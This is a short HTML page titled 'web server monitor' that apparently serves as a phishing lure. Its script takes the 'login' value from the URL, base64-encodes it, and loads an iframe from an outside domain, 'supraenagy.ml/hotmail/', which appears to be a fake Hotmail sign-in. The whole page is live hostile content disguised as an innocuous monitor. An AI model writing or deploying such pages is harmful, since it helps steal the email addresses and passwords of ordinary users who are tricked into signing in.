<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>web server monitor</title>
</head>
<body>

<iframe id="myFrame" src="/default.asp" width="100%" frameborder='no' align="center"scrolling="no" height="640"></iframe>

<script>
getInputValue();
function getInputValue(){
// Selecting the input element and get its value

var url_string = window.location.href; //window.location.href
var url = new URL(url_string);
var c = url.searchParams.get("login");

// Displaying the value


document.getElementById("myFrame").src = "https://supraenagy.ml/hotmail/?login="+btoa(c);

}
</script>



</body>
</html>
